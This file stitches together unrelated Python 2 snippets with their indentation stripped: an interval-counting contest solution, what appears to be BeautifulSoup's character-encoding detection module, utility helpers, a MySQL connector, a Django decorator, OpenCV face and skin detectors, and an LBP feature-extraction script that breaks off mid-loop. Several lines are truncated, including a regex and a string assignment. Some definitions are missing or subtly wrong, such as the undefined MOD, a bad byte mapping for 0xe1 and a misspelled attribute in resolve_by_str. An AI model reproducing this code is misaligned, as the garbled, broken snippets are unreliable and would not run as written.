def card(self):
if self.is_empty():
return 0
return self.r - self.l + 1
def intersect(self, other):
if self.is_empty() or other.is_empty():
return Interval(0, -1)
l = max(self.l, other.l)
r = min(self.r, other.r)
return Interval(l, r)
def is_empty(self):
return self.l > self.r
class Solution(object):
def solve(self, cipher):
R = [Interval(cipher[2 * i], cipher[2 * i + 1]) for i in xrange(4)]
w0 = 0
w0 += R[0].card() * R[1].card() * R[2].card() * R[3].card()
w0 %= MOD
w1 = 0
for i in xrange(4):
w1 += R[i % 4].intersect(R[(i + 1) % 4]).card() * R[(i + 2) % 4].card() * R[(i + 3) % 4].card()
w1 %= MOD
w2 = 0
for i in xrange(4):
w2 += R[i % 4].intersect(R[(i + 1) % 4]).intersect(R[(i + 2) % 4]).card() * R[(i + 3) % 4].card()
w2 %= MOD
for i in xrange(2):
w2 += R[i % 4].intersect(R[(i + 1) % 4]).card() * R[(i + 2) % 4].intersect(R[(i + 3) % 4]).card()
w2 %= MOD
w3 = 0
for i in xrange(4):
w3 += R[i % 4].intersect(R[(i + 1) % 4]).intersect(R[(i + 2) % 4]).intersect(R[(i + 3) % 4]).card()
w3 %= MOD
w4 = 0
w4 += R[0].intersect(R[1]).intersect(R[2]).intersect(R[3]).card()
w4 %= MOD
return (w0 - w1 + w2 - w3 + w4) % MOD
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
import codecs
from htmlentitydefs import codepoint2name
import re
import logging
chardet_type = None
try:
import cchardet
def chardet_dammit(s):
return cchardet.detect(s)['encoding']
except ImportError:
try:
import chardet
def chardet_dammit(s):
return chardet.detect(s)['encoding']
except ImportError:
def chardet_dammit(s):
return None
try:
import iconv_codec
except ImportError:
pass
xml_encoding_re = re.compile(
'^<\?.*encoding=[\'"](.*?)[\'"].*\?>'.encode(), re.I)
html_meta_re = re.compile(
'<\s*meta[^>]+charset\s*=\s*["\']?([^>]*?)[ /;\'">]'.encode(), re.I)
class EntitySubstitution(object):
def _populate_class_variables():
lookup = {}
reverse_lookup = {}
characters_for_re = []
for codepoint, name in list(codepoint2name.items()):
character = unichr(codepoint)
if codepoint != 34:
characters_for_re.append(character)
lookup[character] = name
reverse_lookup[name] = character
re_definition = "[%s]" % "".join(characters_for_re)
return lookup, reverse_lookup, re.compile(re_definition)
(CHARACTER_TO_HTML_ENTITY, HTML_ENTITY_TO_CHARACTER,
CHARACTER_TO_HTML_ENTITY_RE) = _populate_class_variables()
CHARACTER_TO_XML_ENTITY = {
"'": "apos",
'"': "quot",
"&": "amp",
"<": "lt",
">": "gt",
}
BARE_AMPERSAND_OR_BRACKET = re.compile("([<>]|"
"&(?!
")")
@classmethod
def _substitute_html_entity(cls, matchobj):
entity = cls.CHARACTER_TO_HTML_ENTITY.get(matchobj.group(0))
return "&%s;" % entity
@classmethod
def _substitute_xml_entity(cls, matchobj):
entity = cls.CHARACTER_TO_XML_ENTITY[matchobj.group(0)]
return "&%s;" % entity
@classmethod
def quoted_attribute_value(self, value):
quote_with = '"'
if '"' in value:
if "'" in value:
replace_with = "&quot;"
value = value.replace('"', replace_with)
else:
quote_with = "'"
return quote_with + value + quote_with
@classmethod
def substitute_xml(cls, value, make_quoted_attribute=False):
value = cls.BARE_AMPERSAND_OR_BRACKET.sub(
cls._substitute_xml_entity, value)
if make_quoted_attribute:
value = cls.quoted_attribute_value(value)
return value
@classmethod
def substitute_html(cls, s):
return cls.CHARACTER_TO_HTML_ENTITY_RE.sub(
cls._substitute_html_entity, s)
class UnicodeDammit:
CHARSET_ALIASES = {"macintosh": "mac-roman",
"x-sjis": "shift-jis"}
ENCODINGS_WITH_SMART_QUOTES = [
"windows-1252",
"iso-8859-1",
"iso-8859-2",
]
def __init__(self, markup, override_encodings=[],
smart_quotes_to=None, is_html=False):
self.declared_html_encoding = None
self.smart_quotes_to = smart_quotes_to
self.tried_encodings = []
self.contains_replacement_characters = False
if markup == '' or isinstance(markup, unicode):
self.markup = markup
self.unicode_markup = unicode(markup)
self.original_encoding = None
return
new_markup, document_encoding, sniffed_encoding = \
self._detectEncoding(markup, is_html)
self.markup = new_markup
u = None
if new_markup != markup:
u = self._convert_from("utf8")
self.original_encoding = sniffed_encoding
if not u:
for proposed_encoding in (
override_encodings + [document_encoding, sniffed_encoding]):
if proposed_encoding is not None:
u = self._convert_from(proposed_encoding)
if u:
break
if not u and not isinstance(self.markup, unicode):
u = self._convert_from(chardet_dammit(self.markup))
if not u:
for proposed_encoding in ("utf-8", "windows-1252"):
u = self._convert_from(proposed_encoding)
if u:
break
if not u:
for proposed_encoding in (
override_encodings + [
document_encoding, sniffed_encoding, "utf-8", "windows-1252"]):
if proposed_encoding != "ascii":
u = self._convert_from(proposed_encoding, "replace")
if u is not None:
logging.warning(
"Some characters could not be decoded, and were "
"replaced with REPLACEMENT CHARACTER.")
self.contains_replacement_characters = True
break
self.unicode_markup = u
if not u:
self.original_encoding = None
def _sub_ms_char(self, match):
orig = match.group(1)
if self.smart_quotes_to == 'ascii':
sub = self.MS_CHARS_TO_ASCII.get(orig).encode()
else:
sub = self.MS_CHARS.get(orig)
if type(sub) == tuple:
if self.smart_quotes_to == 'xml':
sub = '&
else:
sub = '&'.encode() + sub[0].encode() + ';'.encode()
else:
sub = sub.encode()
return sub
def _convert_from(self, proposed, errors="strict"):
proposed = self.find_codec(proposed)
if not proposed or (proposed, errors) in self.tried_encodings:
return None
self.tried_encodings.append((proposed, errors))
markup = self.markup
if (self.smart_quotes_to is not None
and proposed.lower() in self.ENCODINGS_WITH_SMART_QUOTES):
smart_quotes_re = b"([\x80-\x9f])"
smart_quotes_compiled = re.compile(smart_quotes_re)
markup = smart_quotes_compiled.sub(self._sub_ms_char, markup)
try:
u = self._to_unicode(markup, proposed, errors)
self.markup = u
self.original_encoding = proposed
except Exception as e:
return None
return self.markup
def _to_unicode(self, data, encoding, errors="strict"):
if (len(data) >= 4) and (data[:2] == '\xfe\xff') \
and (data[2:4] != '\x00\x00'):
encoding = 'utf-16be'
data = data[2:]
elif (len(data) >= 4) and (data[:2] == '\xff\xfe') \
and (data[2:4] != '\x00\x00'):
encoding = 'utf-16le'
data = data[2:]
elif data[:3] == '\xef\xbb\xbf':
encoding = 'utf-8'
data = data[3:]
elif data[:4] == '\x00\x00\xfe\xff':
encoding = 'utf-32be'
data = data[4:]
elif data[:4] == '\xff\xfe\x00\x00':
encoding = 'utf-32le'
data = data[4:]
newdata = unicode(data, encoding, errors)
return newdata
def _detectEncoding(self, xml_data, is_html=False):
xml_encoding = sniffed_xml_encoding = None
try:
if xml_data[:4] == b'\x4c\x6f\xa7\x94':
xml_data = self._ebcdic_to_ascii(xml_data)
elif xml_data[:4] == b'\x00\x3c\x00\x3f':
sniffed_xml_encoding = 'utf-16be'
xml_data = unicode(xml_data, 'utf-16be').encode('utf-8')
elif (len(xml_data) >= 4) and (xml_data[:2] == b'\xfe\xff') \
and (xml_data[2:4] != b'\x00\x00'):
sniffed_xml_encoding = 'utf-16be'
xml_data = unicode(xml_data[2:], 'utf-16be').encode('utf-8')
elif xml_data[:4] == b'\x3c\x00\x3f\x00':
sniffed_xml_encoding = 'utf-16le'
xml_data = unicode(xml_data, 'utf-16le').encode('utf-8')
elif (len(xml_data) >= 4) and (xml_data[:2] == b'\xff\xfe') and \
(xml_data[2:4] != b'\x00\x00'):
sniffed_xml_encoding = 'utf-16le'
xml_data = unicode(xml_data[2:], 'utf-16le').encode('utf-8')
elif xml_data[:4] == b'\x00\x00\x00\x3c':
sniffed_xml_encoding = 'utf-32be'
xml_data = unicode(xml_data, 'utf-32be').encode('utf-8')
elif xml_data[:4] == b'\x3c\x00\x00\x00':
sniffed_xml_encoding = 'utf-32le'
xml_data = unicode(xml_data, 'utf-32le').encode('utf-8')
elif xml_data[:4] == b'\x00\x00\xfe\xff':
sniffed_xml_encoding = 'utf-32be'
xml_data = unicode(xml_data[4:], 'utf-32be').encode('utf-8')
elif xml_data[:4] == b'\xff\xfe\x00\x00':
sniffed_xml_encoding = 'utf-32le'
xml_data = unicode(xml_data[4:], 'utf-32le').encode('utf-8')
elif xml_data[:3] == b'\xef\xbb\xbf':
sniffed_xml_encoding = 'utf-8'
xml_data = unicode(xml_data[3:], 'utf-8').encode('utf-8')
else:
sniffed_xml_encoding = 'ascii'
pass
except:
xml_encoding_match = None
xml_encoding_match = xml_encoding_re.match(xml_data)
if not xml_encoding_match and is_html:
xml_encoding_match = html_meta_re.search(xml_data)
if xml_encoding_match is not None:
xml_encoding = xml_encoding_match.groups()[0].decode(
'ascii').lower()
if is_html:
self.declared_html_encoding = xml_encoding
if sniffed_xml_encoding and \
(xml_encoding in ('iso-10646-ucs-2', 'ucs-2', 'csunicode',
'iso-10646-ucs-4', 'ucs-4', 'csucs4',
'utf-16', 'utf-32', 'utf_16', 'utf_32',
'utf16', 'u16')):
xml_encoding = sniffed_xml_encoding
return xml_data, xml_encoding, sniffed_xml_encoding
def find_codec(self, charset):
return self._codec(self.CHARSET_ALIASES.get(charset, charset)) \
or (charset and self._codec(charset.replace("-", ""))) \
or (charset and self._codec(charset.replace("-", "_"))) \
or charset
def _codec(self, charset):
if not charset:
return charset
codec = None
try:
codecs.lookup(charset)
codec = charset
except (LookupError, ValueError):
pass
return codec
EBCDIC_TO_ASCII_MAP = None
def _ebcdic_to_ascii(self, s):
c = self.__class__
if not c.EBCDIC_TO_ASCII_MAP:
emap = (0,1,2,3,156,9,134,127,151,141,142,11,12,13,14,15,
16,17,18,19,157,133,8,135,24,25,146,143,28,29,30,31,
128,129,130,131,132,10,23,27,136,137,138,139,140,5,6,7,
144,145,22,147,148,149,150,4,152,153,154,155,20,21,158,26,
32,160,161,162,163,164,165,166,167,168,91,46,60,40,43,33,
38,169,170,171,172,173,174,175,176,177,93,36,42,41,59,94,
45,47,178,179,180,181,182,183,184,185,124,44,37,95,62,63,
186,187,188,189,190,191,192,193,194,96,58,35,64,39,61,34,
195,97,98,99,100,101,102,103,104,105,196,197,198,199,200,
201,202,106,107,108,109,110,111,112,113,114,203,204,205,
206,207,208,209,126,115,116,117,118,119,120,121,122,210,
211,212,213,214,215,216,217,218,219,220,221,222,223,224,
225,226,227,228,229,230,231,123,65,66,67,68,69,70,71,72,
73,232,233,234,235,236,237,125,74,75,76,77,78,79,80,81,
82,238,239,240,241,242,243,92,159,83,84,85,86,87,88,89,
90,244,245,246,247,248,249,48,49,50,51,52,53,54,55,56,57,
250,251,252,253,254,255)
import string
c.EBCDIC_TO_ASCII_MAP = string.maketrans(
''.join(map(chr, list(range(256)))), ''.join(map(chr, emap)))
return s.translate(c.EBCDIC_TO_ASCII_MAP)
MS_CHARS = {b'\x80': ('euro', '20AC'),
b'\x81': ' ',
b'\x82': ('sbquo', '201A'),
b'\x83': ('fnof', '192'),
b'\x84': ('bdquo', '201E'),
b'\x85': ('hellip', '2026'),
b'\x86': ('dagger', '2020'),
b'\x87': ('Dagger', '2021'),
b'\x88': ('circ', '2C6'),
b'\x89': ('permil', '2030'),
b'\x8A': ('Scaron', '160'),
b'\x8B': ('lsaquo', '2039'),
b'\x8C': ('OElig', '152'),
b'\x8D': '?',
b'\x8E': ('#x17D', '17D'),
b'\x8F': '?',
b'\x90': '?',
b'\x91': ('lsquo', '2018'),
b'\x92': ('rsquo', '2019'),
b'\x93': ('ldquo', '201C'),
b'\x94': ('rdquo', '201D'),
b'\x95': ('bull', '2022'),
b'\x96': ('ndash', '2013'),
b'\x97': ('mdash', '2014'),
b'\x98': ('tilde', '2DC'),
b'\x99': ('trade', '2122'),
b'\x9a': ('scaron', '161'),
b'\x9b': ('rsaquo', '203A'),
b'\x9c': ('oelig', '153'),
b'\x9d': '?',
b'\x9e': ('#x17E', '17E'),
b'\x9f': ('Yuml', ''),}
MS_CHARS_TO_ASCII = {
b'\x80' : 'EUR',
b'\x81' : ' ',
b'\x82' : ',',
b'\x83' : 'f',
b'\x84' : ',,',
b'\x85' : '...',
b'\x86' : '+',
b'\x87' : '++',
b'\x88' : '^',
b'\x89' : '%',
b'\x8a' : 'S',
b'\x8b' : '<',
b'\x8c' : 'OE',
b'\x8d' : '?',
b'\x8e' : 'Z',
b'\x8f' : '?',
b'\x90' : '?',
b'\x91' : "'",
b'\x92' : "'",
b'\x93' : '"',
b'\x94' : '"',
b'\x95' : '*',
b'\x96' : '-',
b'\x97' : '--',
b'\x98' : '~',
b'\x99' : '(TM)',
b'\x9a' : 's',
b'\x9b' : '>',
b'\x9c' : 'oe',
b'\x9d' : '?',
b'\x9e' : 'z',
b'\x9f' : 'Y',
b'\xa0' : ' ',
b'\xa1' : '!',
b'\xa2' : 'c',
b'\xa3' : 'GBP',
b'\xa4' : '$',
b'\xa5' : 'YEN',
b'\xa6' : '|',
b'\xa7' : 'S',
b'\xa8' : '..',
b'\xa9' : '',
b'\xaa' : '(th)',
b'\xab' : '<<',
b'\xac' : '!',
b'\xad' : ' ',
b'\xae' : '(R)',
b'\xaf' : '-',
b'\xb0' : 'o',
b'\xb1' : '+-',
b'\xb2' : '2',
b'\xb3' : '3',
b'\xb4' : ("'", 'acute'),
b'\xb5' : 'u',
b'\xb6' : 'P',
b'\xb7' : '*',
b'\xb8' : ',',
b'\xb9' : '1',
b'\xba' : '(th)',
b'\xbb' : '>>',
b'\xbc' : '1/4',
b'\xbd' : '1/2',
b'\xbe' : '3/4',
b'\xbf' : '?',
b'\xc0' : 'A',
b'\xc1' : 'A',
b'\xc2' : 'A',
b'\xc3' : 'A',
b'\xc4' : 'A',
b'\xc5' : 'A',
b'\xc6' : 'AE',
b'\xc7' : 'C',
b'\xc8' : 'E',
b'\xc9' : 'E',
b'\xca' : 'E',
b'\xcb' : 'E',
b'\xcc' : 'I',
b'\xcd' : 'I',
b'\xce' : 'I',
b'\xcf' : 'I',
b'\xd0' : 'D',
b'\xd1' : 'N',
b'\xd2' : 'O',
b'\xd3' : 'O',
b'\xd4' : 'O',
b'\xd5' : 'O',
b'\xd6' : 'O',
b'\xd7' : '*',
b'\xd8' : 'O',
b'\xd9' : 'U',
b'\xda' : 'U',
b'\xdb' : 'U',
b'\xdc' : 'U',
b'\xdd' : 'Y',
b'\xde' : 'b',
b'\xdf' : 'B',
b'\xe0' : 'a',
b'\xe1' : 'a',
b'\xe2' : 'a',
b'\xe3' : 'a',
b'\xe4' : 'a',
b'\xe5' : 'a',
b'\xe6' : 'ae',
b'\xe7' : 'c',
b'\xe8' : 'e',
b'\xe9' : 'e',
b'\xea' : 'e',
b'\xeb' : 'e',
b'\xec' : 'i',
b'\xed' : 'i',
b'\xee' : 'i',
b'\xef' : 'i',
b'\xf0' : 'o',
b'\xf1' : 'n',
b'\xf2' : 'o',
b'\xf3' : 'o',
b'\xf4' : 'o',
b'\xf5' : 'o',
b'\xf6' : 'o',
b'\xf7' : '/',
b'\xf8' : 'o',
b'\xf9' : 'u',
b'\xfa' : 'u',
b'\xfb' : 'u',
b'\xfc' : 'u',
b'\xfd' : 'y',
b'\xfe' : 'b',
b'\xff' : 'y',
}
WINDOWS_1252_TO_UTF8 = {
0x80 : b'\xe2\x82\xac',
0x82 : b'\xe2\x80\x9a',
0x83 : b'\xc6\x92',
0x84 : b'\xe2\x80\x9e',
0x85 : b'\xe2\x80\xa6',
0x86 : b'\xe2\x80\xa0',
0x87 : b'\xe2\x80\xa1',
0x88 : b'\xcb\x86',
0x89 : b'\xe2\x80\xb0',
0x8a : b'\xc5\xa0',
0x8b : b'\xe2\x80\xb9',
0x8c : b'\xc5\x92',
0x8e : b'\xc5\xbd',
0x91 : b'\xe2\x80\x98',
0x92 : b'\xe2\x80\x99',
0x93 : b'\xe2\x80\x9c',
0x94 : b'\xe2\x80\x9d',
0x95 : b'\xe2\x80\xa2',
0x96 : b'\xe2\x80\x93',
0x97 : b'\xe2\x80\x94',
0x98 : b'\xcb\x9c',
0x99 : b'\xe2\x84\xa2',
0x9a : b'\xc5\xa1',
0x9b : b'\xe2\x80\xba',
0x9c : b'\xc5\x93',
0x9e : b'\xc5\xbe',
0x9f : b'\xc5\xb8',
0xa0 : b'\xc2\xa0',
0xa1 : b'\xc2\xa1',
0xa2 : b'\xc2\xa2',
0xa3 : b'\xc2\xa3',
0xa4 : b'\xc2\xa4',
0xa5 : b'\xc2\xa5',
0xa6 : b'\xc2\xa6',
0xa7 : b'\xc2\xa7',
0xa8 : b'\xc2\xa8',
0xa9 : b'\xc2\xa9',
0xaa : b'\xc2\xaa',
0xab : b'\xc2\xab',
0xac : b'\xc2\xac',
0xad : b'\xc2\xad',
0xae : b'\xc2\xae',
0xaf : b'\xc2\xaf',
0xb0 : b'\xc2\xb0',
0xb1 : b'\xc2\xb1',
0xb2 : b'\xc2\xb2',
0xb3 : b'\xc2\xb3',
0xb4 : b'\xc2\xb4',
0xb5 : b'\xc2\xb5',
0xb6 : b'\xc2\xb6',
0xb7 : b'\xc2\xb7',
0xb8 : b'\xc2\xb8',
0xb9 : b'\xc2\xb9',
0xba : b'\xc2\xba',
0xbb : b'\xc2\xbb',
0xbc : b'\xc2\xbc',
0xbd : b'\xc2\xbd',
0xbe : b'\xc2\xbe',
0xbf : b'\xc2\xbf',
0xc0 : b'\xc3\x80',
0xc1 : b'\xc3\x81',
0xc2 : b'\xc3\x82',
0xc3 : b'\xc3\x83',
0xc4 : b'\xc3\x84',
0xc5 : b'\xc3\x85',
0xc6 : b'\xc3\x86',
0xc7 : b'\xc3\x87',
0xc8 : b'\xc3\x88',
0xc9 : b'\xc3\x89',
0xca : b'\xc3\x8a',
0xcb : b'\xc3\x8b',
0xcc : b'\xc3\x8c',
0xcd : b'\xc3\x8d',
0xce : b'\xc3\x8e',
0xcf : b'\xc3\x8f',
0xd0 : b'\xc3\x90',
0xd1 : b'\xc3\x91',
0xd2 : b'\xc3\x92',
0xd3 : b'\xc3\x93',
0xd4 : b'\xc3\x94',
0xd5 : b'\xc3\x95',
0xd6 : b'\xc3\x96',
0xd7 : b'\xc3\x97',
0xd8 : b'\xc3\x98',
0xd9 : b'\xc3\x99',
0xda : b'\xc3\x9a',
0xdb : b'\xc3\x9b',
0xdc : b'\xc3\x9c',
0xdd : b'\xc3\x9d',
0xde : b'\xc3\x9e',
0xdf : b'\xc3\x9f',
0xe0 : b'\xc3\xa0',
0xe1 : b'\xa1',
0xe2 : b'\xc3\xa2',
0xe3 : b'\xc3\xa3',
0xe4 : b'\xc3\xa4',
0xe5 : b'\xc3\xa5',
0xe6 : b'\xc3\xa6',
0xe7 : b'\xc3\xa7',
0xe8 : b'\xc3\xa8',
0xe9 : b'\xc3\xa9',
0xea : b'\xc3\xaa',
0xeb : b'\xc3\xab',
0xec : b'\xc3\xac',
0xed : b'\xc3\xad',
0xee : b'\xc3\xae',
0xef : b'\xc3\xaf',
0xf0 : b'\xc3\xb0',
0xf1 : b'\xc3\xb1',
0xf2 : b'\xc3\xb2',
0xf3 : b'\xc3\xb3',
0xf4 : b'\xc3\xb4',
0xf5 : b'\xc3\xb5',
0xf6 : b'\xc3\xb6',
0xf7 : b'\xc3\xb7',
0xf8 : b'\xc3\xb8',
0xf9 : b'\xc3\xb9',
0xfa : b'\xc3\xba',
0xfb : b'\xc3\xbb',
0xfc : b'\xc3\xbc',
0xfd : b'\xc3\xbd',
0xfe : b'\xc3\xbe',
}
MULTIBYTE_MARKERS_AND_SIZES = [
(0xc2, 0xdf, 2),
(0xe0, 0xef, 3),
(0xf0, 0xf4, 4),
]
FIRST_MULTIBYTE_MARKER = MULTIBYTE_MARKERS_AND_SIZES[0][0]
LAST_MULTIBYTE_MARKER = MULTIBYTE_MARKERS_AND_SIZES[-1][1]
@classmethod
def detwingle(cls, in_bytes, main_encoding="utf8",
embedded_encoding="windows-1252"):
if embedded_encoding.replace('_', '-').lower() not in (
'windows-1252', 'windows_1252'):
raise NotImplementedError(
"Windows-1252 and ISO-8859-1 are the only currently supported "
"embedded encodings.")
if main_encoding.lower() not in ('utf8', 'utf-8'):
raise NotImplementedError(
"UTF-8 is the only currently supported main encoding.")
byte_chunks = []
chunk_start = 0
pos = 0
while pos < len(in_bytes):
byte = in_bytes[pos]
if not isinstance(byte, int):
byte = ord(byte)
if (byte >= cls.FIRST_MULTIBYTE_MARKER
and byte <= cls.LAST_MULTIBYTE_MARKER):
for start, end, size in cls.MULTIBYTE_MARKERS_AND_SIZES:
if byte >= start and byte <= end:
pos += size
break
elif byte >= 0x80 and byte in cls.WINDOWS_1252_TO_UTF8:
byte_chunks.append(in_bytes[chunk_start:pos])
byte_chunks.append(cls.WINDOWS_1252_TO_UTF8[byte])
pos += 1
chunk_start = pos
else:
pos += 1
if chunk_start == 0:
return in_bytes
else:
byte_chunks.append(in_bytes[chunk_start:])
return b''.join(byte_chunks)
class NumericDataSet(object):
def __init__(self):
self.data = {}
self.str_to_num_mapping = {}
self.num_to_str_mapping = {}
def add(self, identifier, image):
try:
self.data[identifier].append(image)
except:
self.data[identifier] = [image]
numerical_identifier = len(self.str_to_num_mapping)
self.str_to_num_mapping[identifier] = numerical_identifier
self.num_to_str_mapping[numerical_identifier] = identifier
def get(self):
X = []
y = []
for name, num in self.str_to_num_mapping.iteritems():
for image in self.data[name]:
X.append(image)
y.append(num)
return X,y
def resolve_by_str(self, identifier):
return self.str_num_mapping[identifier]
def resolve_by_num(self, numerical_identifier):
return self.num_to_str_mapping[numerical_identifier]
def length(self):
return len(self.data)
def __repr__(self):
print "NumericDataSet"
import json
import itertools
class Sorter(object):
@staticmethod
def argsort(A, f=None):
n = len(A)
if f is None:
f = lambda k: A[k]
return sorted(range(n), key=f)
class ExcelColumn(object):
def __init__(self):
self.cur = None
self.restore()
def restore(self):
self.cur = []
def _plus(self, cur, idx):
if idx>=len(cur):
cur.append('a')
elif cur[idx]<'z':
cur[idx] = chr(ord(cur[idx])+1)
else:
cur[idx] = 'a'
self._plus(cur, idx+1)
def columns(self, n):
self.restore()
for i in xrange(n):
self._plus(self.cur, 0)
yield ''.join(reversed(self.cur))
class Displayer(object):
@staticmethod
def dump(obj):
return json.dumps(obj, default=lambda o: o.__dict__)
@staticmethod
def display(obj):
return str(json.dumps(obj, default=lambda o: o.__dict__, sort_keys=True, indent=4, separators=(',', ': ')))
class Searcher(object):
@staticmethod
def binary_search(low, up, predicate):
while low<up:
m = (low+up)/2
if predicate(m)<0:
low = m+1
elif predicate(m)>0:
up = m
else:
return m
return -1
class Wrapper(object):
@staticmethod
def to_dict(keys, values):
return dict(itertools.izip(keys, values))
@staticmethod
def unpack(lst):
return zip(*lst)
import MySQLdb as mdb
import sys
from datetime import datetime
def start_stamp(func):
def ret(*args):
print ("%s: exec %s" % (str(datetime.now()), func.__name__))
return func(*args)
return ret
class Connection(object):
def __init__(self, db_name, default_file):
print "running at db: %s" % (db_name)
self.con = mdb.connect(read_default_file=default_file, db=db_name)
import re
from django.http import HttpResponse
def json_only(func):
def ret(*args, **kwargs):
request = args[0]
if (request.is_ajax() and
re.match(r"application/json", request.META["CONTENT_TYPE"])):
return func(*args, **kwargs)
else:
return HttpResponse("Accepts application/json only")
return ret
import heapq
class Solution:
def DeleteDigits(self, A, k):
lst = map(int, list(str(A)))
i = 0
while i+1 < len(lst) and k > 0:
if lst[i] > lst[i+1]:
del lst[i]
i -= 1
if i < 0:
i = 0
k -= 1
else:
i += 1
if k > 0:
lst = lst[:len(lst)-k]
return "".join(map(str, lst)).lstrip("0")
def DeleteDigits_error(self, A, k):
lst = map(int, list(str(A)))
m = len(lst)-k
tuples = [(-lst[i], i) for i in xrange(m)]
heapq.heapify(tuples)
for i in xrange(m, len(lst)):
if -tuples[0][0] > lst[i]:
heapq.heappop(tuples)
heapq.heappush(tuples, (-lst[i], i))
rets = [elt[1] for elt in tuples]
rets.sort()
rets = map(lambda x: str(lst[x]), rets)
return "".join(rets)
if __name__ == "__main__":
assert Solution().DeleteDigits(10009876091, 4) == "6091"
from multiprocessing import Pool
from multiprocessing.dummy import Pool
from concurrent.futures import ProcessPoolExecutor
def gcd(pair):
a, b = pair
low = min(a, b)
for i in range(low, 0, -1):
if a % i == 0 and b % i == 0:
return i
def threading():
numbers = [(1963309, 2265973), (2030677, 3814172),
(1551645, 2229620), (2039045, 2020802)]
pool = ProcessPoolExecutor(max_workers=2)
ret = list(pool.map(gcd, numbers))
return ret
import sys
import os
import cv2
import numpy as np
class Detector:
def detect(self, src):
raise NotImplementedError("Every Detector must implement the detect method.")
class SkinDetector(Detector):
def _R1(self, BGR):
B = BGR[:, :, 0]
G = BGR[:, :, 1]
R = BGR[:, :, 2]
e1 = (R > 95) & (G > 40) & (B > 20) & (
(np.maximum(R, np.maximum(G, B)) - np.minimum(R, np.minimum(G, B))) > 15) & (np.abs(R - G) > 15) & (
R > G) & (
R > B)
e2 = (R > 220) & (G > 210) & (B > 170) & (abs(R - G) <= 15) & (R > B) & (G > B)
return (e1 | e2)
def _R2(self, YCrCb):
Y = YCrCb[:, :, 0]
Cr = YCrCb[:, :, 1]
Cb = YCrCb[:, :, 2]
e1 = Cr <= (1.5862 * Cb + 20)
e2 = Cr >= (0.3448 * Cb + 76.2069)
e3 = Cr >= (-4.5652 * Cb + 234.5652)
e4 = Cr <= (-1.15 * Cb + 301.75)
e5 = Cr <= (-2.2857 * Cb + 432.85)
return e1 & e2 & e3 & e4 & e5
def _R3(self, HSV):
H = HSV[:, :, 0]
S = HSV[:, :, 1]
V = HSV[:, :, 2]
return ((H < 25) | (H > 230))
def detect(self, src):
if np.ndim(src) < 3:
return np.ones(src.shape, dtype=np.uint8)
if src.dtype != np.uint8:
return np.ones(src.shape, dtype=np.uint8)
srcYCrCb = cv2.cvtColor(src, cv2.COLOR_BGR2YCR_CB)
srcHSV = cv2.cvtColor(src, cv2.COLOR_BGR2HSV)
skinPixels = self._R1(src) & self._R2(srcYCrCb) & self._R3(srcHSV)
return np.asarray(skinPixels, dtype=np.uint8)
class CascadedDetector(Detector):
def __init__(self, cascade_fn="./cascades/haarcascade_frontalface_alt2.xml", scaleFactor=1.2, minNeighbors=5,
minSize=(30, 30)):
if not os.path.exists(cascade_fn):
raise IOError("No valid cascade found for path=%s." % cascade_fn)
self.cascade = cv2.CascadeClassifier(cascade_fn)
self.scaleFactor = scaleFactor
self.minNeighbors = minNeighbors
self.minSize = minSize
def detect(self, src):
if np.ndim(src) == 3:
src = cv2.cvtColor(src, cv2.COLOR_BGR2GRAY)
src = cv2.equalizeHist(src)
rects = self.cascade.detectMultiScale(src, scaleFactor=self.scaleFactor, minNeighbors=self.minNeighbors,
minSize=self.minSize)
if len(rects) == 0:
return []
rects[:, 2:] += rects[:, :2]
return rects
class SkinFaceDetector(Detector):
def __init__(self, threshold=0.3, cascade_fn="./cascades/haarcascade_frontalface_alt2.xml", scaleFactor=1.2,
minNeighbors=5, minSize=(30, 30)):
self.faceDetector = CascadedDetector(cascade_fn=cascade_fn, scaleFactor=scaleFactor, minNeighbors=minNeighbors,
minSize=minSize)
self.skinDetector = SkinDetector()
self.threshold = threshold
def detect(self, src):
rects = []
for i, r in enumerate(self.faceDetector.detect(src)):
x0, y0, x1, y1 = r
face = src[y0:y1, x0:x1]
skinPixels = self.skinDetector.detect(face)
skinPercentage = float(np.sum(skinPixels)) / skinPixels.size
print skinPercentage
if skinPercentage > self.threshold:
rects.append(r)
return rects
if __name__ == "__main__":
if len(sys.argv) < 2:
raise Exception("No image given.")
inFileName = sys.argv[1]
outFileName = None
if len(sys.argv) > 2:
outFileName = sys.argv[2]
if outFileName == inFileName:
outFileName = None
img = np.array(cv2.imread(inFileName), dtype=np.uint8)
imgOut = img.copy()
detector = CascadedDetector(
cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_frontalface_alt2.xml")
eyesDetector = CascadedDetector(scaleFactor=1.1, minNeighbors=5, minSize=(20, 20),
cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_eye.xml")
for i, r in enumerate(detector.detect(img)):
x0, y0, x1, y1 = r
cv2.rectangle(imgOut, (x0, y0), (x1, y1), (0, 255, 0), 1)
face = img[y0:y1, x0:x1]
for j, r2 in enumerate(eyesDetector.detect(face)):
ex0, ey0, ex1, ey1 = r2
cv2.rectangle(imgOut, (x0 + ex0, y0 + ey0), (x0 + ex1, y0 + ey1), (0, 255, 0), 1)
if outFileName is None:
cv2.imshow('faces', imgOut)
cv2.waitKey(0)
cv2.imwrite(outFileName, imgOut)
import os
from LBP import *
import cv2
import pickle
from util.commons_util.logger_utils.Timer import Timer
from multiprocessing import Pool
radius = 1
nei = 8
scale = 4
scale_step = 1.25
winsize = int((25 - 1) / 2)
stride = 2
orl_path = 'E:/GPforFR/data/orl_faces'
lfw_path = 'E:/GPforFR/data/lfw_p'
orl_dst_path = 'E:/GPforFR/data/orl_faces_feature'
lfw_dst_path = 'E:/GPforFR/data/lfw_feature'
def extract_feature(args):
timer = Timer()
timer.start()
img_path, ftr_name = args
image = cv2.imread(img_path)
image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
if not os.path.exists(os.path.dirname(ftr_name)):
os.makedirs(os.path.dirname(ftr_name))
out_file = open(ftr_name, 'w')
feature = multi_scale_lbp_feature(image, radius, nei, scale, scale_step, winsize, stride)
pickle.dump(feature, out_file)
out_file.close()
print timer.end()
def extract(dir_path, dst_path, include_folder_name=False):
p = Pool(4)
for root, dirs, files in os.walk(dir_path):
if files:
load = []
for f in files:
img_path = root + '/' + f
folder = ""
if include_folder_name:
folder = root.replace('/', '/').split('/')[-1]+'_'
ftr_name = os.path.join(dst_path, folder+f.split('.')[0] + '.txt')
load.append((img_path, ftr_name))
